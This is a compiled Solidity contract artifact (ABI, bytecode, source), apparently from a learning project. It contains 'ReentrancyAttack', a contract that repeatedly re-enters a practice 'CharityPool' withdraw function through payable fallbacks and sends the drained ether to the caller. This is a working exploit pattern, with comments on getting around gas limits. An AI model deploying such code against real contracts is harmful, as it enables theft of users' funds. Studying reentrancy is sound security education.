{
  "contractName": "ReentrancyAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_charityPool",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "WEI_SCALE",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "WITHDRAW_TO_USER",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "charityPool",
      "outputs": [
        {
          "internalType": "contract CharityPool",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fallback1",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fallback2",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "initiateAttack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "initiateAttack2",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260026000806101000a81548160ff021916908360ff160217905550670de0b6b3a764000060015534801561003757600080fd5b506040516105ee3803806105ee8339818101604052602081101561005a57600080fd5b810190808051906020019092919050505080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610532806100bc6000396000f3fe60806040526004361061007b5760003560e01c80638f856eab1161004e5780638f856eab146100fd578063ac262f7c14610154578063e0a1f3c81461017f578063f4a0470c146101965761007b565b8063263c26eb146100805780636e2ef5c8146100b15780636f9fb98a146100c8578063836afd3a146100f3575b600080fd5b34801561008c57600080fd5b506100956101a0565b604051808260ff1660ff16815260200191505060405180910390f35b3480156100bd57600080fd5b506100c66101b2565b005b3480156100d457600080fd5b506100dd610294565b6040518082815260200191505060405180910390f35b6100fb6102b3565b005b34801561010957600080fd5b50610112610380565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016057600080fd5b506101696103a6565b6040518082815260200191505060405180910390f35b34801561018b57600080fd5b506101946103ac565b005b61019e610430565b005b6000809054906101000a900460ff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f7c318056040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561021c57600080fd5b505af1158015610230573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610291573d6000803e3d6000fd5b50565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6729a2241af62c0000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061037e57600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f7c318056040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561036557600080fd5b505af1158015610379573d6000803e3d6000fd5b505050505b565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635bf9204f6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561041657600080fd5b505af115801561042a573d6000803e3d6000fd5b50505050565b6729a2241af62c0000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106104fb57600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635bf9204f6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156104e257600080fd5b505af11580156104f6573d6000803e3d6000fd5b505050505b56fea265627a7a72315820ac9e7fc059cc8b9df445cab72347e85004d32d53ec2fc7c7698984248eefc57b64736f6c63430005100032",
  "source": "\npragma solidity ^0.5.0;\n\n\nimport './CharityPool.sol';\n\ncontract ReentrancyAttack {\n\n    uint8 public WITHDRAW_TO_USER = 2;\n    uint256 public WEI_SCALE = 10**18;\n    CharityPool public charityPool;\n\n    constructor(address _charityPool) public {\n        charityPool = CharityPool(_charityPool);\n    }\n\n    function getContractBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    // NOTE: callback function below limited to 2300 gas.  700 to read\n    // .. contract balance, 200 for the if statement, and when withdraw\n    // .. gets called that's another 9000 for it's transfer function, \n    // .. so no good!  SOLUTION, use .call in withdraw\n\n    // function() external payable { (could've used receive()) upgrade version\n        // Fallback limited to 2300 gas.  Costs more gas to load state\n        // .. variables which require storage access. SO, we could\n        // .. use local variables, which require significantly less gas\n        // .. Could do primitives to save even more gas.\n        // (initializing a variable or a bigger value increases gas too.)\n        \n        // uint8 MIN_CHARITY_BALANCE = 3;\n        // uint256 WEI_SCALE = 10**18;\n        // uint256 total = MIN_CHARITY_BALANCE * WEI_SCALE;\n    //     if (address(charityPool).balance >= 3000000000000000000) {\n    //         charityPool.withdraw();\n    //     }\n    // }\n\n    // callback function: Automatically handles\n    // .. incoming Ether and updates the contract's balance.\n    function fallback1() external payable {\n        if (address(charityPool).balance >= 3000000000000000000) {\n            charityPool.failedWithdrawAttack();\n        }\n    }\n\n    function fallback2() external payable {\n        if (address(charityPool).balance >= 3000000000000000000) {\n            charityPool.successfulWithdrawAttack();\n        }\n    }\n\n    function initiateAttack() public {\n        charityPool.failedWithdrawAttack();\n    }\n\n    function initiateAttack2() public {\n        charityPool.successfulWithdrawAttack();\n        msg.sender.transfer(address(this).balance);\n    }\n\n}\n",
  "sourcePath": "/Users/Nelson/Desktop/DEX-web-app/src/contracts/Hack And Charity Pool/ReentrancyAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-07-24T18:30:53.496Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}